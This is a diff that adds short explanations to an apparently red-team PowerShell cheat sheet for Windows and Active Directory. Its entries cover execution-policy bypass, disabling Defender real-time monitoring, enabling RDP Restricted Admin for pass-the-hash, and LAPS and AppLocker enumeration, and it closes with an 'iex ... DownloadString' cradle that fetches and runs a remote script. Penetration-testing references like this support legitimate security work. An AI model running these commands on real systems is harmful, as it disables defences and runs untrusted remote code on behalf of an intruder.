@@ -6,6 +6,8 @@
 
 Spawn bypass execution policy with Powershell.
 
+Loosen execution policy at the user scope so unsigned scripts run without prompts.
+
 ```sh title:"Powershell Spawn Bypass Execution Policy"
 Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Unrestricted -Force;
 ```
@@ -14,6 +16,8 @@ Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Unrestricted -Force;
 ### Enable RDP Restricted Admin
 
 Enable RDP restricted admin with Powershell.
+
+Flip the registry bit that allows RDP Restricted Admin (lets PtH reach RDP without sending a password).
 
 ```sh title:"Powershell Enable RDP Restricted Admin"
 reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
@@ -24,6 +28,8 @@ reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestric
 
 Disable defender RTP with Powershell.
 
+Disable Defender real-time monitoring. Requires admin and Tamper Protection disabled.
+
 ```sh title:"Powershell Disable Defender RTP"
 Set-MpPreference -DisableRealTimeMonitoring $true
 ```
@@ -32,6 +38,8 @@ Set-MpPreference -DisableRealTimeMonitoring $true
 ### Defender status
 
 Read defender status with Powershell.
+
+Query Defender status: signature age, RTP state, AMSI state.
 
 ```sh title:"Powershell Read Defender Status"
 Get-MpComputerStatus
@@ -42,6 +50,8 @@ Get-MpComputerStatus
 
 Install RSAT AD (Server) with Powershell.
 
+Install the AD PowerShell module on a Windows Server.
+
 ```sh title:"Powershell Install RSAT AD (Server)"
 Install-WindowsFeature RSAT-AD-PowerShell
 ```
@@ -50,6 +60,8 @@ Install-WindowsFeature RSAT-AD-PowerShell
 ### Install RSAT (Desktop)
 
 Install RSAT (Desktop) with Powershell.
+
+Install all RSAT capabilities on a Windows desktop SKU (Win10/11).
 
 ```sh title:"Powershell Install RSAT (Desktop)"
 Get-WindowsCapability -Name RSAT* -Online | Add-WindowsCapability -Online
@@ -60,6 +72,8 @@ Get-WindowsCapability -Name RSAT* -Online | Add-WindowsCapability -Online
 
 Spawn import AD module with Powershell.
 
+Load the AD module into the current session so Get-ADUser etc. resolve.
+
 ```sh title:"Powershell Spawn Import AD Module"
 Import-Module ActiveDirectory
 ```
@@ -68,6 +82,8 @@ Import-Module ActiveDirectory
 ### AppLocker policy
 
 Read AppLocker policy with Powershell.
+
+Pull the effective AppLocker rules. Read this before dropping binaries on locked-down hosts.
 
 ```sh title:"Powershell Read AppLocker Policy"
 Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
@@ -78,6 +94,8 @@ Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
 
 Read LAPS delegated groups with Powershell.
 
+Identify groups delegated to read LAPS passwords. From the LAPS PowerShell module.
+
 ```sh title:"Powershell Read LAPS Delegated Groups"
 Find-LAPSDelegatedGroups
 ```
@@ -86,6 +104,8 @@ Find-LAPSDelegatedGroups
 ### LAPS extended rights
 
 Read LAPS extended rights with Powershell.
+
+Find principals with extended rights to read LAPS-managed `ms-Mcs-AdmPwd`.
 
 ```sh title:"Powershell Read LAPS Extended Rights"
 Find-AdmPwdExtendedRights
@@ -96,6 +116,8 @@ Find-AdmPwdExtendedRights
 
 Dump LAPS enabled computers with Powershell.
 
+List computer objects that have a LAPS password set.
+
 ```sh title:"Powershell Dump LAPS Enabled Computers"
 Get-LAPSComputers
 ```
@@ -104,6 +126,8 @@ Get-LAPSComputers
 ### List loaded modules
 
 List loaded modules with Powershell.
+
+Show every PowerShell module currently loaded in the session.
 
 ```sh title:"Powershell List Loaded Modules"
 Get-Module
@@ -114,6 +138,8 @@ Get-Module
 
 Show execution policy with Powershell.
 
+Show effective execution policy for every scope.
+
 ```sh title:"Powershell Show Execution Policy"
 Get-ExecutionPolicy -List
 ```
@@ -123,6 +149,8 @@ Get-ExecutionPolicy -List
 
 Spawn per process bypass with Powershell.
 
+Bypass execution policy for the current process only (most reversible setting).
+
 ```sh title:"Powershell Spawn Per Process Bypass"
 Set-ExecutionPolicy Bypass -Scope Process
 ```
@@ -131,6 +159,8 @@ Set-ExecutionPolicy Bypass -Scope Process
 ### Inline script from URL
 
 Download inline script from URL with Powershell.
+
+Classic in-memory script loader: download a remote `.ps1` and pipe straight into Invoke-Expression.
 
 ```sh title:"Powershell Download Inline Script from URL"
 iex(New-Object Net.WebClient).DownloadString('$URL')
